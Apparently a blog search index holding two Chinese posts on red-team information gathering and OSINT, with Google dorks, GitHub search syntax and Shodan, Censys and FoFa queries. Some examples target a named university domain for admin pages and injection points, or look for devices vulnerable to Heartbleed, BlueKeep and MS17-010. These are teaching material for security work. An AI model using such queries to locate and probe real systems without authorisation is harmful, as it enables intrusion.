<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>信息收集流程介绍</title>
    <url>/post/d584f360.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="基本的红队测试流程介绍"><a href="#基本的红队测试流程介绍" class="headerlink" title="基本的红队测试流程介绍"></a>基本的红队测试流程介绍</h2><ol>
<li><p>接到项目合同并制定相应计划</p>
</li>
<li><p>准备相应的工具和材料</p>
</li>
<li><p>做第一次信息收集</p>
</li>
<li><p>做漏洞扫描或攻击面测试</p>
</li>
<li><p>针对突出的攻击面做具体的渗透</p>
</li>
<li><p>进入环境之后的第二次信息收集</p>
</li>
<li><p>提升权限</p>
</li>
<li><p>维持选项</p>
</li>
<li><p>寻找扩大攻击面的渠道</p>
</li>
<li><p>清理攻击痕迹</p>
</li>
<li><p>编写报告</p>
</li>
</ol>
<h2 id="信息收集在整个红队测试流程中的定位"><a href="#信息收集在整个红队测试流程中的定位" class="headerlink" title="信息收集在整个红队测试流程中的定位"></a>信息收集在整个红队测试流程中的定位</h2><p>每一步的攻击流程都是非常重要的。</p>
<p>如果最终达到的目的不需要某几部流程，那么就完全不用去做。</p>
<p>信息收集在整个渗透测试流程中是非常重要的步骤，是决定攻击是否成功的决定点。</p>
<p>信息收集决定之后的攻击面或漏洞扫描的范围，也决定整个攻击过程中对自己和目标的定位。</p>
<h3 id="信息收集的基本要求"><a href="#信息收集的基本要求" class="headerlink" title="信息收集的基本要求"></a>信息收集的基本要求</h3><ol>
<li><p>全面 做到对目标所有的业务面和非业务面的存在点进行全面信息收集。</p>
</li>
<li><p>准确 对收集到的信息尤其是重要信息再三确认其信息的准确性，对信息的内容所涉及的技术要点手动查看。</p>
</li>
<li><p>时效 对收集到的信息要注意信息产生的时间和收集到的时间，是否具有时间差，时间差能否接受，如果存在失效的信息要及时清除。</p>
</li>
<li><p>清晰 对收集到的信息要逻辑清晰，能清楚地分辨出各个收集到的信息之间的逻辑关系和资产之间的相对位置，对于总体目标要有清晰的资产逻辑和业务逻辑认识。</p>
</li>
<li><p>拓扑 对于收集到的信息要以这些为起点做拓扑再次进行信息收集。</p>
</li>
</ol>
<h3 id="信息收集的底层逻辑"><a href="#信息收集的底层逻辑" class="headerlink" title="信息收集的底层逻辑"></a>信息收集的底层逻辑</h3><p>通过各种渠道对目标已公开或未公开的信息做提取。</p>
<h3 id="信息收集的注意事项"><a href="#信息收集的注意事项" class="headerlink" title="信息收集的注意事项"></a>信息收集的注意事项</h3><p>降低被发现度、提高隐蔽性。</p>
<p>细心与耐心。</p>
<h3 id="信息收集的对象"><a href="#信息收集的对象" class="headerlink" title="信息收集的对象"></a>信息收集的对象</h3><p>根据目标的不同，目标需要什么要素运行，我们就收集什么要素。</p>
<p>比如一个web站点，需要收集的信息如下：</p>
<ul>
<li><p>服务器IP</p>
</li>
<li><p>操作系统</p>
</li>
<li><p>Web容器</p>
</li>
<li><p>端口</p>
</li>
<li><p>协议</p>
</li>
<li><p>CDN</p>
</li>
<li><p>HTTPS证书</p>
</li>
<li><p>域名</p>
</li>
<li><p>DNS</p>
</li>
<li><p>脚本语言</p>
</li>
<li><p>框架、CMS</p>
</li>
<li><p>数据库</p>
</li>
<li><p>负载匀衡</p>
</li>
<li><p>WAF</p>
</li>
<li><p>敏感目录</p>
</li>
<li><p>代码泄露</p>
</li>
</ul>
<p>一个微信小程序，需要收集的信息如下：</p>
<ul>
<li><p>接口</p>
</li>
<li><p>信任域名</p>
</li>
<li><p>JS、AJAX</p>
</li>
</ul>
<h3 id="信息收集的分类"><a href="#信息收集的分类" class="headerlink" title="信息收集的分类"></a>信息收集的分类</h3><p>主动信息收集</p>
<p>被动信息收集</p>
<h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol>
<li><p>第三方的信息收集机构或者平台已经收集到目标的信息</p>
</li>
<li><p>第三方的信息收集机构或者平台将信息存储在某处</p>
</li>
<li><p>攻击者从存储信息的地方查询信息</p>
</li>
<li><p>攻击者得到相应信息</p>
</li>
</ol>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点：</p>
<ol>
<li><p>隐蔽性高，不容易被发现</p>
</li>
<li><p>收集的信息量和覆盖面比较大</p>
</li>
</ol>
<p>缺点：</p>
<ol>
<li><p>收集到信息的时效性或准确性不高</p>
</li>
<li><p>无法收集到敏感或者未公开的信息</p>
</li>
</ol>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>被动信息收集在实战中非常常用，尤其是在网络安全攻防对抗中，我们通常见到的各种渗透流程也会经常使用被动信息收集，比如通过被动信息收集获得目标的基本要素，然后根据信息要素判断特定并分析脆弱点，最后根据脆弱点针对性地做下一步的攻击活动。</p>
<h3 id="实战中的被动信息收集是怎么做的"><a href="#实战中的被动信息收集是怎么做的" class="headerlink" title="实战中的被动信息收集是怎么做的"></a>实战中的被动信息收集是怎么做的</h3><p><strong>多工具、多平台、分布式</strong>。结合这三点的大型信息收集综合项目，并且收集到的信息会集中整合和自动化的分析处理。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>开源情报与搜索引擎</title>
    <url>/post/7544e3e7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="OSINT的介绍"><a href="#OSINT的介绍" class="headerlink" title="OSINT的介绍"></a>OSINT的介绍</h2><p>开源情报是指合法地从公开和可公开获得的资源中收集数据和信息的做法。OSINT操作——无论是由IT安全专家、恶意行为者还是民族国家支持的情报人员所实施——使用先进的技术来搜索海量的可见数据，以找到满足他们需求的信息。</p>
<p>尽管下述许多OSINT工具是开源的，但本文中的“开源”并不是指开源软件运动；相反，它描述了被分析数据的公共性质。</p>
<p>OSINT在许多方面是操作安全（OPSEC）的镜像，在这个信息大爆炸的时代，OSINT对于密切关注有效信息显得至关重要。如果分析得当，这些数据可能会揭示破坏性的真相。IT安全部门越来越多地承担在自己的组织中执行OSINT操作以支持操作安全的任务。</p>
<p>如今，市场上大多数OSINT工具都提供下述三种关键功能，其中许多工具在某一特定领域表现得格外突出。</p>
<h3 id="发现面向公众的资产"><a href="#发现面向公众的资产" class="headerlink" title="发现面向公众的资产"></a>发现面向公众的资产</h3><p>它们最常见的功能是帮助IT团队发现面向公众的资产，并绘制每个人所拥有的可能导致潜在攻击面的信息。一般来说，它们不会试图寻找程序漏洞或执行渗透测试之类的事情。它们的主要工作是记录某人可以在无需诉诸黑客攻击的情况下公开找到的有关公司资产的信息。</p>
<h3 id="发现组织外的相关信息"><a href="#发现组织外的相关信息" class="headerlink" title="发现组织外的相关信息"></a>发现组织外的相关信息</h3><p>一些OSINT工具执行的第二个功能是在组织外部（例如在社交媒体帖子中或在可能位于严格定义的网络之外的域和位置）寻找相关信息。那些进行了大量收购并获得了他们要合并的公司的 IT 资产的组织会发现此功能非常有用。鉴于社交媒体的急剧增长和流行，在公司范围之外寻找敏感信息可能对任何群体都有帮助。</p>
<h3 id="将发现的信息整理成可操作的形式"><a href="#将发现的信息整理成可操作的形式" class="headerlink" title="将发现的信息整理成可操作的形式"></a>将发现的信息整理成可操作的形式</h3><p>最后，一些OSINT工具有助于将所有发现的信息整理和分组为有用且可操作的情报。为大型企业运行OSINT扫描可以产生数十万个结果，尤其是在包括内部和外部资产的情况下。整合所有数据并且能够优先处理最严重的问题将非常有帮助。</p>
<h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>Google hacking 也叫 Google dorking，是一种利用谷歌搜索和其他谷歌应用程序来发现网站配置和计算机代码中的安全漏洞的计算机黑客技术。</p>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><div class="table-container">
<table>
<thead>
<tr>
<th><strong>通配符</strong></th>
<th><strong>语义</strong></th>
<th><strong>说明</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>包含关键字</td>
<td>+前面必须要有一个空格</td>
<td>admin +login</td>
</tr>
<tr>
<td>-</td>
<td>排除关键字</td>
<td>-前面必须要有一个空格</td>
<td>mysql -csdn</td>
</tr>
<tr>
<td>~</td>
<td>同义词</td>
<td>~前面必须要有一个空格</td>
<td>admin ~login</td>
</tr>
<tr>
<td>*</td>
<td>模糊查询</td>
<td>*代替任意字符</td>
<td>mysql**</td>
</tr>
<tr>
<td>“”</td>
<td>强调</td>
<td>-</td>
<td>“mysql”</td>
</tr>
</tbody>
</table>
</div>
<h3 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h3><div class="table-container">
<table>
<thead>
<tr>
<th><strong>语法</strong></th>
<th><strong>语义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>intitle</td>
<td>包含标题</td>
</tr>
<tr>
<td>intext</td>
<td>包含内容</td>
</tr>
<tr>
<td>filetype</td>
<td>文件类型</td>
</tr>
<tr>
<td>info</td>
<td>基本信息</td>
</tr>
<tr>
<td>site</td>
<td>指定网站</td>
</tr>
<tr>
<td>inurl</td>
<td>包含某个url</td>
</tr>
<tr>
<td>link</td>
<td>包含指定链接的网页</td>
</tr>
<tr>
<td>cache</td>
<td>显示页面缓存版本</td>
</tr>
<tr>
<td>numberrange</td>
<td>搜索一个数字</td>
</tr>
<tr>
<td>daterange</td>
<td>查找指定日期范围内发布的网页</td>
</tr>
</tbody>
</table>
</div>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>1、查找目录列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:index.of</span><br><span class="line"></span><br><span class="line">intext: index of / | ../ | Parent Directory</span><br></pre></td></tr></table></figure>
<p>2、查找ws_ftp.log文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:index.of ws_ftp.log</span><br><span class="line"></span><br><span class="line">inurl:ws_ftp.log filetype:log</span><br></pre></td></tr></table></figure>
<p>3、查找wordpress泄露的敏感信息文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:wp-content/uploads/data.txt</span><br></pre></td></tr></table></figure>
<p>4、查找后台登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intext:后台登录 | intitle:后台登录</span><br><span class="line"></span><br><span class="line">inurl:/admin intext:后台管理系统</span><br></pre></td></tr></table></figure>
<p>5、查找渗透测试报告</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;渗透测试报告&quot; filetype:doc | filetype:pdf</span><br></pre></td></tr></table></figure>
<p>6、查找wut.edu.cn下的子域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:wut.edu.cn</span><br></pre></td></tr></table></figure>
<p>7、查找wut.edu.cn的后台管理地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:wut.edu.cn inurl:login|admin|admin\_login|login\_admin|system|manager|user|main|cms|dede|guanli|houtai</span><br></pre></td></tr></table></figure>
<p>8、查找wut.edu.cn的可能存在的注入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:wut.edu.cn inurl:php?id|asp?id|aspx?id|jsp?id</span><br></pre></td></tr></table></figure>
<p>9、查找wut.eddu.cn的可能存在的文件上传漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site wut.edu.cn inurl:file|files|load|editor</span><br></pre></td></tr></table></figure>
<p>10、查看baidu.com的缓存信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cache:baidu.com</span><br></pre></td></tr></table></figure>
<h3 id="谷歌黑客数据库"><a href="#谷歌黑客数据库" class="headerlink" title="谷歌黑客数据库"></a>谷歌黑客数据库</h3><p>收录众多谷歌搜索语句</p>
<div>https://www.uedbox.com/shdb/</div><div>https://www.exploit-db.com/google-hacking-database</div>



<h2 id="GitHub-Hacking"><a href="#GitHub-Hacking" class="headerlink" title="GitHub Hacking"></a>GitHub Hacking</h2><p>GitHub是世界上最大的<del>同性交友</del>代码托管平台,超5千万开发者正在使用。</p>
<p>Github不仅能托管代码，还能对代码进行搜索，我们感受到了其便利的同时，也应该时刻注意，当你上传并公开你的代码时，一时大意，让某些敏感的配置信息文件等暴露于众。</p>
<h3 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a>搜索仓库</h3><div class="table-container">
<table>
<thead>
<tr>
<th><strong>查询</strong></th>
<th><strong>示例</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;n</td>
<td>cats start:&gt;1000 匹配含有 “cats” 字样、星标超过 1000 个的仓库。</td>
</tr>
<tr>
<td>&gt;=n</td>
<td>cats topics:&gt;=5 匹配含有 “cats” 字样、有 5 个或更多主题的仓库。</td>
</tr>
<tr>
<td>&lt;n</td>
<td>cats size:&lt;10000 匹配小于 10 KB 的文件中含有 “cats” 字样的代码。</td>
</tr>
<tr>
<td>&lt;=n</td>
<td>cats stars:&lt;=50 匹配含有 “cats” 字样、星标不超过 50 个的仓库。</td>
</tr>
<tr>
<td>n..*</td>
<td>cats stars:10..* 匹配含有 “cats” 字样、有 10 个或更多星标的仓库。</td>
</tr>
<tr>
<td>*..n</td>
<td>cats stars:10..* 匹配含有 “cats” 字样、有 10 个或更多星标的仓库。</td>
</tr>
<tr>
<td>n..n</td>
<td>cats stars:10..50 匹配含有 “cats” 字样、有 10 到 50 个星号的仓库。</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索代码"><a href="#搜索代码" class="headerlink" title="搜索代码"></a>搜索代码</h3><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>只能搜索小于384KB的文件。 只能搜索少于500,000个文件的存储库。</p>
<p>登陆的用户可以搜索所有公共存储库。</p>
<p>除 <strong>filename</strong> 搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索 <strong>language:javascript</strong>) 无效，而是这样：<strong>amazing language:javascript</strong>。 搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。</p>
<p>不能将以下通配符用作搜索查询的一部分：</p>
<div style="font-weight: bold;">. , : ; / ' " = \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\* ! ? # $ & \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\+ ^ | ~ &lt; \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\&gt; ( ) { } 。</div>

<p>搜索将忽略这些符号。</p>
<h4 id="日期条件"><a href="#日期条件" class="headerlink" title="日期条件"></a>日期条件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cats pushed:&lt;2012-0705 			<span class="comment">#搜索在2012年7月05日前push代码，且cats作为关键</span></span><br><span class="line">cats pushed:2016-04-30..2016-07-04 	<span class="comment">#日期区间</span></span><br><span class="line">cats created:&gt;=2017-04-01 		<span class="comment">#创建时间</span></span><br></pre></td></tr></table></figure>
<h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AND		<span class="comment">#与</span></span><br><span class="line">OR		<span class="comment">#或</span></span><br><span class="line">NOT		<span class="comment">#非</span></span><br></pre></td></tr></table></figure>
<h4 id="排除运算"><a href="#排除运算" class="headerlink" title="排除运算"></a>排除运算</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库</span></span><br><span class="line">cats pushed:&lt;2012-07-05 - language:java</span><br></pre></td></tr></table></figure>
<h4 id="包含搜索"><a href="#包含搜索" class="headerlink" title="包含搜索"></a>包含搜索</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hacker <span class="keyword">in</span>:file  		<span class="comment">#搜索文件中包含Hacker的代码</span></span><br><span class="line">Hacker <span class="keyword">in</span>:path  		<span class="comment">#搜索路径中包含Hacker的代码</span></span><br><span class="line">Hacker <span class="keyword">in</span>:path,file  		<span class="comment">#搜索路径、文件中包含Hacker的代码</span></span><br><span class="line">console path:app/public language:javascript  	<span class="comment">#搜索关键字console，且语言为JavaScript在app/public下的代码</span></span><br></pre></td></tr></table></figure>
<h4 id="主体搜索"><a href="#主体搜索" class="headerlink" title="主体搜索"></a>主体搜索</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user:USERNAME  				<span class="comment">#用户名搜索</span></span><br><span class="line">org:ORGNAME  				<span class="comment">#组织搜索</span></span><br><span class="line">repo:USERNAME/PEPOSITORY  		<span class="comment">#指定仓库搜索</span></span><br></pre></td></tr></table></figure>
<h4 id="文件名称"><a href="#文件名称" class="headerlink" title="文件名称"></a>文件名称</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filename:config.php language:php	<span class="comment">#搜索文件名为config.php，且语言为PHP的代码</span></span><br><span class="line">mail filename:.properties			<span class="comment">#搜索JAVA项目的配置文件，且中包含mail的代码</span></span><br></pre></td></tr></table></figure>
<h4 id="扩展名搜索"><a href="#扩展名搜索" class="headerlink" title="扩展名搜索"></a>扩展名搜索</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#extension:EXTENSION  指定扩展名搜索</span></span><br><span class="line">php extension:config</span><br></pre></td></tr></table></figure>
<h3 id="自动化工具——GitMiner"><a href="#自动化工具——GitMiner" class="headerlink" title="自动化工具——GitMiner"></a>自动化工具——GitMiner</h3><p>GitMiner是一款自动化的高级敏感内容挖掘工具。此工具旨在通过代码或代码片段在github搜索页面进行挖掘，并以此来证明公共存储库的脆弱性，以及将包含敏感信息的代码存储在其中所带来的安全隐患。</p>
<p>项目地址：<a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a></p>
<p><img src="https://camo.githubusercontent.com/2948ef418da7976011be94027341182378fc0055361a079d8c2813febd71a00b/68747470733a2f2f322e62702e626c6f6773706f742e636f6d2f2d4762707a524f6945796e512f56744c7974664d715169492f4141414141414141626e6b2f356844706850344d6266342f73313630302f776f7264707265737345582e706e67" alt="Screenshot"></p>
<h2 id="Shodan-搜索引擎"><a href="#Shodan-搜索引擎" class="headerlink" title="Shodan 搜索引擎"></a>Shodan 搜索引擎</h2><p>Shodan 在百度百科里被给出了这么一句话介绍： Shodan 是互联网上最可怕的搜索引擎。为什么呢？与谷歌、百度等搜索引擎爬取网页信息不同，Shodan 爬取的是互联网上所有设备的 IP 地址及其端口号。</p>
<p>网址：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<h3 id="高级过滤搜索"><a href="#高级过滤搜索" class="headerlink" title="高级过滤搜索"></a>高级过滤搜索</h3><ul>
<li>hostname：搜索指定的主机或域名，例如 hostname:“google”</li>
<li>port：搜索指定的端口或服务，例如 port:“8080”</li>
<li>country：搜索指定的国家，例如 country:“CN”</li>
<li>city：搜索指定的城市，例如 city:“yantai”</li>
<li>org：搜索指定的组织或公司，例如 org:“google”</li>
<li>isp：搜索指定的ISP供应商，例如 isp:“China Telecom”</li>
<li>product：搜索指定的操作系统/软件/平台，例如 product:“Apache httpd”</li>
<li>version：搜索指定的软件版本，例如 version:“2.1.2”</li>
<li>geo：搜索指定的地理位置，参数为经纬度，例如 geo:“44.56, 119.65”</li>
<li>before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:“11-11-15”</li>
<li>net：搜索指定的IP地址或子网，例如 net:“102.45.10.0/24”</li>
</ul>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>1、查找位于合肥的Apache服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache city:&quot;Hefei&quot;</span><br></pre></td></tr></table></figure>
<p>2、查找位于国内的Nginx服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx country:&quot;CN&quot;</span><br></pre></td></tr></table></figure>
<p>3、查找GWS（Google Web Server）服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server:gws hostname:&quot;google&quot;</span><br></pre></td></tr></table></figure>
<p>4、查找指定网段华为设备</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">huawei net:&quot;64.191.146.0/24&quot;</span><br></pre></td></tr></table></figure>
<p>5、查找国内的 海康威视网络摄像头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server:Hikvision-Webs country:&quot;CN&quot;</span><br></pre></td></tr></table></figure>
<p>6、查找SQ-WEBCAM摄像头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server: SQ-WEBCAM</span><br></pre></td></tr></table></figure>
<p>7、搜索美国受“心脏滴血”漏洞影响的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">country:US vuln:CVE-2014-0160</span><br></pre></td></tr></table></figure>
<p>8、根据网页图标收集资产</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.favicon.hash:-1825654886</span><br><span class="line"></span><br><span class="line">注：查询值为目标站点图标文件的hash值</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在每次查询后，在左上角有几个功能，Exploits，maps，create report等</p>
<p><strong>exploits</strong>是系统帮我们查找不同类型的方式来查找。</p>
<p><strong>maps</strong>是生成地图，用来查看主机在世界各地的分布。红色标记就是主机地址</p>
<p><strong>create report</strong>是针对此次搜索，生成报告发给邮件，也可以去账户里查看以前生成的报告。</p>
<h3 id="Shodan命令行"><a href="#Shodan命令行" class="headerlink" title="Shodan命令行"></a>Shodan命令行</h3><p>Shodan搜索引擎拥有自己的API接口，前提是先注册。可以使用命令行工具，也可以使用python等编程软件调用。</p>
<p>Shodan命令行模式有很多优点，比如导出搜索数据与解析搜索数据，还有可以指定显示数据得关键字段。</p>
<p>1、导入key：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan init &lt;key&gt;</span><br></pre></td></tr></table></figure>
<p>2、显示自己的公网ip：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan myip</span><br></pre></td></tr></table></figure>
<p>3、查看指定cve漏洞在shodan发现的总数 ‘’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan count vuln:cve-2019-0708</span><br></pre></td></tr></table></figure>
<p>4、查看指定cve漏洞的地区分布情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan stats vuln:cve-2019-0708</span><br></pre></td></tr></table></figure>
<p>5、列出存在漏洞的top20的私有云服务商</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan stats --facets org:20 vuln:cve-2019-0708 tag:cloud</span><br></pre></td></tr></table></figure>
<p>7、筛选指定端口、指定协议存在的漏洞数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan stats port:445 SMB vuln:ms17-010</span><br></pre></td></tr></table></figure>
<p>8、 查看某ip相关的所有信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan host 219.140.59.238</span><br></pre></td></tr></table></figure>
<p>9、保存某ip的相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan host --save 219.140.59.238</span><br></pre></td></tr></table></figure>
<p>10、查看下载下来的数据信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan parse 219.140.59.238.json.gz</span><br></pre></td></tr></table></figure>
<p>11、通过扫描得到最新的服务器信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shodan scan submit 219.140.59.238</span><br></pre></td></tr></table></figure>
<h2 id="Censys-搜索引擎"><a href="#Censys-搜索引擎" class="headerlink" title="Censys 搜索引擎"></a>Censys 搜索引擎</h2><p>与最流行的搜索引擎Shodan非常类似。Censys是一款免费的搜索引擎，最初由密歇根大学的研究人员在10月发行，目前由谷歌提供支持。 Censys搜索引擎能够扫描整个互联网，Censys 每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
<p>Censys更偏向于证书查询</p>
<p>网址：<a href="https://search.censys.io/">https://search.censys.io/</a></p>
<h3 id="搜索示例"><a href="#搜索示例" class="headerlink" title="搜索示例"></a>搜索示例</h3><p>默认情况下censys支持全文检索，支持正则。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip:23.0.0.0/8 or 8.8.8.0/24　　						可以使用逻辑运算</span><br><span class="line"></span><br><span class="line">services.http.response.status_code: 200　　			指定状态</span><br><span class="line"></span><br><span class="line">services.http.response.status_code: [200 to 300]　　	200-300之间的状态码</span><br><span class="line"></span><br><span class="line">location.country_code: DE　　							国家</span><br><span class="line"></span><br><span class="line">services.port: 21 or services.service_name: FTP　　	协议</span><br><span class="line"></span><br><span class="line">services.software.product:apache　　					服务器类型版本</span><br><span class="line"></span><br><span class="line">autonomous_system.description: University　　			系统描述</span><br></pre></td></tr></table></figure>
<h2 id="FoFa-搜索引擎"><a href="#FoFa-搜索引擎" class="headerlink" title="FoFa 搜索引擎"></a>FoFa 搜索引擎</h2><p>FOFA 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
<p>FoFa更偏向于企业资产收集</p>
<p>网址：<a href="https://fofa.so/">https://fofa.so/</a></p>
<h3 id="搜索示例-1"><a href="#搜索示例-1" class="headerlink" title="搜索示例"></a>搜索示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;abc&quot; 	从标题中搜索abc。例：标题中有北京的网站。</span><br><span class="line"></span><br><span class="line">header=&quot;abc&quot; 	从http头中搜索abc。例：jboss服务器。</span><br><span class="line"></span><br><span class="line">body=&quot;abc&quot; 		从html正文中搜索abc。例：正文包含Hacked by。</span><br><span class="line"></span><br><span class="line">domain=&quot;qq.com&quot; 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</span><br><span class="line"></span><br><span class="line">host=&quot;.gov.cn&quot; 	从url中搜索.gov.cn,注意搜索要用host作为名称。</span><br><span class="line"></span><br><span class="line">port=&quot;443&quot; 		查找对应443端口的资产。例： 查找对应443端口的资产。</span><br><span class="line"></span><br><span class="line">ip=&quot;1.1.1.1&quot; 	从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</span><br><span class="line"></span><br><span class="line">protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</span><br><span class="line"></span><br><span class="line">city=”Beijing” 	搜索指定城市的资产。例： 搜索指定城市的资产。</span><br><span class="line"></span><br><span class="line">region=&quot;Zhejiang&quot; 搜索指定行政区的资产。例： 搜索指定行政区的资产。</span><br><span class="line"></span><br><span class="line">country=&quot;CN&quot; 	搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</span><br><span class="line"></span><br><span class="line">cert=&quot;google.com&quot; 搜索证书(https或者imaps等)中带有google.com的资产。</span><br></pre></td></tr></table></figure>
<h3 id="高级搜索示例"><a href="#高级搜索示例" class="headerlink" title="高级搜索示例"></a>高级搜索示例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;powered by&quot; &amp;&amp; title!=discuz</span><br><span class="line"></span><br><span class="line">title!=&quot;powered by&quot; &amp;&amp; body=discuz</span><br><span class="line"></span><br><span class="line">( body=&quot;content=WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) ) &amp;&amp; host=&quot;gov.cn&quot;</span><br></pre></td></tr></table></figure>
<h2 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h2><p>国内互联网安全厂商知道创宇开放了他们的海量数据库，对之前沉淀的数据进行了整合、整理，打造了一个名符其实的网络空间搜索引擎ZoomEye，该搜索引擎的后端数据计划包括两部分：</p>
<p>1、网站组件指纹：包括操作系统，Web服务，服务端语言，Web开发框架，Web应用，前端库及第三方组件等等。</p>
<p>2、主机设备指纹：结合NMAP大规模扫描结果进行整合。 目前只上线了第一部分网站组件指纹。</p>
